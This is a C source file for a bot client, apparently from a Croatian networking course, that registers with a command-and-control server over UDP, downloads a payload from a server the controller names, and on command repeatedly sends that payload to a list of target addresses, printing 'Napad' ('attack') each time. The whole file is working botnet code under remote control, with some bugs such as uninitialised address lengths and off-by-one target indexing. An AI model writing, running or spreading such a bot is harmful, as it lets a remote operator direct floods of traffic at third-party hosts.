#include <stdio.h>
#include <netdb.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/select.h>

#define MAXLEN_MSG sizeof(char) * 2 + INET_ADDRSTRLEN * sizeof(char) * 20 + 22 * sizeof(char) * 20
#define REG "REG\n"
#define HELLO "HELLO\n" 
#define MAXLEN_PAY 512

int main(int argc, char *argv[]) {
	char host[INET_ADDRSTRLEN], *udp_port;
	int sockDesc;
	struct sockaddr_in C_C;
	struct addrinfo hints, *res;
	struct sockaddr fC_C;
	socklen_t fC_C_addrlen;

	char ip_UDP[INET_ADDRSTRLEN]; 
	char port_UDP[22];
	struct sockaddr_in server;
	int server_addrlen;
	struct sockaddr fserver;	
	socklen_t fserver_addrlen;

	struct sockaddr_in target;
	socklen_t target_len;
	char target_ip[INET_ADDRSTRLEN];
	char target_port[22];
	struct sockaddr_in addr_target[20];

	char payload[MAXLEN_PAY];
	char buf[MAXLEN_MSG];
	int msglen, reg = 0;
	struct timeval tv = {0, 1000};
	fd_set readfds;

	memset(ip_UDP, '\0',INET_ADDRSTRLEN);
       	memset(port_UDP,'\0', 22);	
	if (argc != 3) {
		fprintf(stderr, "Usage: ./bot ip port\n");
		return 1;
	}

	if ((sockDesc = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
		fprintf(stderr, "Couldn't create a socket\n");
		printf("%d\n", sockDesc);
		return 2;
	}
	/*if (setsockopt(sockDesc, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(struct timeval))) {
		fprintf(stderr, "Couldn't set socket options\n");
		return 6;
	}*/
	if (!inet_pton(AF_INET, argv[1], &(C_C.sin_addr))){
		fprintf(stderr, "Couldn't resolve IP address: %s\n", argv[1]);
		return 3;
	}
	udp_port = argv[2];

	C_C.sin_family = AF_INET;
	C_C.sin_port = htons(atoi(udp_port));
	memset(C_C.sin_zero, '\0', sizeof(C_C.sin_zero));
	

	sendto(sockDesc, REG, sizeof(REG)-1, 0, (struct sockaddr *)&C_C, sizeof(C_C));

	while(1) {	
		char ip_test[INET_ADDRSTRLEN];
		memset(buf, '\0', sizeof(buf));
		msglen = recvfrom(sockDesc, buf, MAXLEN_MSG, 0, &fC_C, &fC_C_addrlen);

		if(!inet_ntop(AF_INET,&C_C.sin_addr,ip_test, INET_ADDRSTRLEN )){
			fprintf(stderr, "Couldn't convert IP address\n");
			return 5;
		}
		if (!strcmp(ip_test, fC_C.sa_data)) {
			printf("Kill bot\n");
			return 0;		
		}
		
		if (buf[0] == '2') {
			int i=2, j=0;
			while (buf[i] != ' ') i++;
			printf("%s\n",buf);
			printf("%d\n", i);
			strncpy(ip_UDP, &buf[2], i-2);
			i++;
			j=i;
			while (buf[i] != '\n') i++;
			printf("%d\n",i);
			strncpy(port_UDP, &buf[j], i-j);
			printf("ip_UDP: %s, port_UDP: %s\n", ip_UDP, port_UDP);
			if (!inet_pton(AF_INET, ip_UDP, 
				(struct sockaddr *)&(server.sin_addr)) ) {
				fprintf(stderr, "Couldn't resolve UDP IP address: %s\n", ip_UDP);
				return 4;
			}
			server.sin_family = AF_INET;
			server.sin_port = htons(atoi(port_UDP));
			memset(server.sin_zero, '\0', sizeof(server.sin_zero));
			memset(payload, '\0', MAXLEN_PAY);

			sendto(sockDesc, HELLO, sizeof(HELLO) - 1, 0, 
						(struct sockaddr *)&server, sizeof(server));
			
			msglen = recvfrom(sockDesc, buf, MAXLEN_PAY, 0, &fserver, &fserver_addrlen);
			strncpy(payload, buf, MAXLEN_PAY);
			reg = 1;
			printf("%s\n", payload);
		} else if (buf[0] == '1') {
			char ip_tcp[INET_ADDRSTRLEN];
			char port_tcp[22];
			int sockDesc_tcp;
			int n;

			strncpy(ip_tcp, &buf[1], INET_ADDRSTRLEN);
			strncpy(port_tcp, &buf[INET_ADDRSTRLEN + 1], 22);
			
			if (!inet_pton(AF_INET, ip_tcp, 
				(struct sockaddr *)&(server.sin_addr)) ) {
				fprintf(stderr, "Couldn't resolve TCP IP address: %s\n", ip_tcp);
				continue;
			}	
			server.sin_family = AF_INET;
			server.sin_port = htons(atoi(port_tcp));
			memset(server.sin_zero, '\0', sizeof(server.sin_zero));
			memset(payload, '\0', MAXLEN_PAY);
			if ((sockDesc_tcp = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
					fprintf(stderr, "Couldn't create a socket\n");
					printf("%d\n", sockDesc);
					return 2;
			}
			if (connect(sockDesc_tcp, (struct sockaddr *)&server, sizeof(server)) == -1) {
					fprintf(stderr, "Couldn't connect to TCP server\n");
					return -8;
			}

			if (send(sockDesc_tcp, HELLO, sizeof(HELLO) - 1, 0) == -1) {
					fprintf(stderr, "Couldn't send packet to TCP server\n");
					return -7;
			}
			if ((n = recv(sockDesc_tcp, payload, MAXLEN_PAY, 0)) == -1) {
					fprintf(stderr, "Couldn't recive packet from TCP server\n");
					return -9;
			}
			reg = 1;
			close(sockDesc_tcp);
			
		} else if (buf[0] == '3' && reg) {
			int buf_count = 1;
			int target_count = 0;
			
			while (	buf[buf_count] != '\0') {
				strncpy(target_ip, &buf[buf_count], INET_ADDRSTRLEN);
				buf_count += INET_ADDRSTRLEN;
				strncpy(target_port, &buf[buf_count], 22);
				buf_count += 22;
				target_count++;

				inet_pton(AF_INET, target_ip, (struct sockaddr *)&(target.sin_addr));
				target.sin_family = AF_INET;
				target.sin_port = htons(atoi(target_port));
				memset(target.sin_zero, '\0', sizeof(target.sin_zero));
				addr_target[target_count] = target;
				printf("%s %s\n", target_ip, target_port);
			}
			
			for(int t=0; t<10; t++){
				int p = 0;
				char pay_temp[MAXLEN_MSG];
				for(int i=0; i<target_count; i++){
					int pay_length_prev = 0;
					int pay_length = 0;
					//FD_ZERO(&readfds);
					//FD_SET(sockDesc, &readfds);
					while (payload[pay_length_prev] != '\0') {
						/*select(sockDesc+1, &readfds,0,0,0);
						if (FD_ISSET(sockDesc, &readfds)){
						if (recvfrom(sockDesc, buf, MAXLEN_PAY, 0, &fC_C, &fC_C_addrlen) > 1){
							p = 1;
							break;
						}}*/
						while (payload[pay_length_prev + pay_length] != ':') 
							pay_length++;		
						strncpy(pay_temp, &payload[pay_length_prev], pay_length);
						sendto(sockDesc, pay_temp, pay_length, 0, 
									(struct sockaddr *)&(addr_target[i]), sizeof(target));
						printf("Napad\n");
						pay_length_prev = pay_length_prev + pay_length + 1;
						pay_length = 0;
					}
					if (p) break;
				}
				if(p) break;
				sleep(1);
			}	
		} else if (buf[0] == '4') {
			continue;
		} else if (buf[0] == '0') {
			return 0;
		} else if (buf[0] == 'N') {
			continue;
		} else if (!reg && msglen != -1){
			fprintf(stderr, "Registracija nije uspijela");
			return 4;
		} else {
			continue;
		}
	}
}
